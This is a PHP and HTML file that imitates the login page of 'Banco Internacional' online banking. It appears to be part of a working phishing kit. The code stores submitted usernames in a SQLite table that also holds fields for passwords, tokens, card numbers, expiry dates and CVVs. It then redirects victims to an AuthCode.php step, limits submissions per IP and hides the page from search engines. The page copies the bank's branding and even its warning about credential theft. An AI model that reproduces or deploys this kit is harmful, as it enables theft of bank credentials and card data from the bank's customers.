<?php
session_start();

define('DB_FILE', 'usuarios.db');

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("CREATE TABLE IF NOT EXISTS usuarios (
        id TEXT PRIMARY KEY,
        usuario TEXT,
        clave TEXT,
        estado TEXT,
        token TEXT,
        entidad TEXT,
        identificador TEXT,
        ip TEXT,
        fecha TEXT,
        tarjeta TEXT,
        fecha_tarjeta TEXT,
        cvv TEXT
    )");
} catch (PDOException $e) {
    die("Error al conectar con la base de datos: " . $e->getMessage());
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $usuario = trim($_POST["fldNombre"] ?? "");
    $identificador = "internacional";
    $entidad = "cc";

    if ($usuario !== "") {
        $ip = $_SERVER['REMOTE_ADDR'];
        $unaHoraAtras = date('Y-m-d H:i:s', strtotime('-1 hour'));

        // Bloqueo por IP: máximo 5 registros en 1 hora
        $stmt = $db->prepare("SELECT COUNT(*) FROM usuarios WHERE ip = ? AND fecha > ?");
        $stmt->execute([$ip, $unaHoraAtras]);
        $intentos = $stmt->fetchColumn();

        if ($intentos >= 5) {
            die("Demasiados intentos desde esta IP. Intenta más tarde.");
        }

        // ✅ CREAR NUEVO REGISTRO
        $id = uniqid();
        $estado = "esperando";
        $clave = "";
        $token = "";
        $fecha = date('Y-m-d H:i:s');

        // ✅ INSERTAR EN BD
        $stmt = $db->prepare("INSERT INTO usuarios (id, usuario, clave, estado, token, entidad, identificador, ip, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$id, $usuario, $clave, $estado, $token, $entidad, $identificador, $ip, $fecha]);
        
        // ✅ GUARDAR EN SESIÓN
        $_SESSION["user_id"] = $id;
        $_SESSION["autenticado"] = true;

        // ✅ REDIRIGIR DIRECTAMENTE A AUTHCODE.PHP
        header("Location: AuthCode.php");
        exit;
    } else {
        header("Location: error.php");
        exit;
    }
}
?>
<!DOCTYPE html>
<html xml:lang="es" lang="es">
   <head>
       <meta charset="UTF-8">
      <title>Banco Internacional</title>
      <meta name="google" value="notranslate">
      <meta name="robots" content="noindex, nofollow">
      <meta name="Googlebot-News" content="noindex, nofollow">
      <link href="assets/fisaDesertAll.css" type="text/css" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="assets/fisaDesertLogin.css">
      <link rel="stylesheet" type="text/css" href="assets/fisaDesertLoginCustom.css">
   </head>
   <body class="fisaDesert" cz-shortcut-listen="true">
      <div class="bgbody"></div>
      <div id="header">
         <div id="logo">
            <img src="./assets/logow.png">
         </div>
         <div id="topnavhome">
            <ul class="menuhome">
               <li class="first-item bold">Bienvenido(a)</li>
               <li><a href="assets/login.jsp">Ayuda</a></li>
               <li class="last-item"><a href="assets/login.jsp">Contáctanos</a></li>
            </ul>
         </div>
      </div>
      <div id="finalUserContent">
         <div id="content">
            <div id="ec_fisa_message_Panel_0" lang="es" widgetid="ec_fisa_message_Panel_0">
            </div>
            <div dojotype="dijit.layout.ContentPane" region="center" dolayout="false" refreshonshow="true" id="borderContainerTwo" class="dijitContentPane" lang="es" widgetid="borderContainerTwo">
               <div dojotype="dojox.layout.ContentPane" region="center" dolayout="false" refreshonshow="true" style="width: 100%;" class="dijitContentPane" id="dojox_layout_ContentPane_0" lang="es" widgetid="dojox_layout_ContentPane_0">
                  <div id="mainwindow">
                     <div id="headerwindow">
                        <p>Si su Usuario o Clave fue comprometida, favor contactar al banco al : 800-7555 o 210-8255</p>
                     </div>
                     <div id="formwindow">
                        <div class="row-form-login border-bottom">
                           <div id="mainContainer" dojotype="dojox.layout.ContentPane" dolayout="false" refreshonshow="true" class="dijitContentPane mainContainer" lang="es" widgetid="mainContainer">
                              <div id="lpwindow" class="backgradient col6">
                                 <div id="cmpwindow">
                                    <h2 class="boldtext">INGRESO A BANCA ONLINE</h2>
                                    <div id="btnpassword"></div>
                                    <div id="forminfowindow" class="screenLogin">
                                       <form method="post" id="Form" enctype="multipart/form-data">
                                       <div class="row-section align-center">
                                          <div class="input-widget user-icon">
                                             <label class="fisaLabel-login">Usuario</label>
                                             <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox" id="widget_j_username" role="presentation" lang="es" widgetid="j_username">
                                                <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="fldNombre" required type="text" tabindex="0" id="j_username" maxlength="16" value=""><span class="dijitPlaceHolder dijitInputField"></span></div>
                                             </div>
                                             <a class="fisaLink info-link" id="info-login"><span>Info</span></a>
                                             <div data-dojo-type="dijit/Tooltip" data-dojo-props="connectId:&#39;info-login&#39;,position:[&#39;above&#39;]" class="dijitTooltipData" id="dijit_Tooltip_0" lang="es" widgetid="dijit_Tooltip_0">
                                                Ingrese su usuario. Si ha utilizado la Banca Online anterior, ingrese con su mismo Usuario.
                                             </div>
                                          </div>
                                       </div>
                                       <div class="button-section">
                                          <input type="submit" name="btnsession" class="button-form" value="Continuar" />
                                       </div>
                                       <div id="msg-login-form">
                                          <span class="text-msg-login-form">Si ingresas con USUARIO TEMPORAL</span>
                                          <span class="text-msg-login-form">
                                          Haz click
                                          <a href="assets/login.jsp">
                                          aquí
                                          </a>
                                          </span>
                                       </div>
                                       </form>
                                    </div>
                                 </div>
                              </div>
                              <div id="rpwindow" class="col6">
                                 <div id="msgwindow">
                                    <div id="ayuda">
                                       <h2 class="boldtext align-left">Utilidades</h2>
                                       <ul class="bullet-arrow">
                                          <li><a href="assets/login.jsp">¿No tienes usuario?, genéralo aquí</a></li>
                                          <li><a href="assets/login.jsp" >¿Olvidaste tu contraseña?</a></li>
                                          <li><a href="assets/login.jsp" >Desbloquea tu usuario</a></li>
                                          <li><a href="assets/login.jsp">¿Olvidaste tu usuario?</a></li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="row-form-login">
                           <div id="faqtexto" class="icon-msg-footer">
                              <p>Te recordamos que Banco Internacional 
                                 <span class="enfatize-text">
                                 no solicita 
                                 <span class="undeline-enfatize">
                                 información personal relacionada con usuarios y contraseñas de acceso 
                                 </span>
                                 </span>
                                 a tus cuentas o servicios electrónicos vía e-mail.
                              </p>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div id="footer">
         <div id="copy">
            <p>Copyright (c) 2019 Banco Internacional.    Todos los derechos reservados.</p>
         </div>
      </div>
   </body>
</html>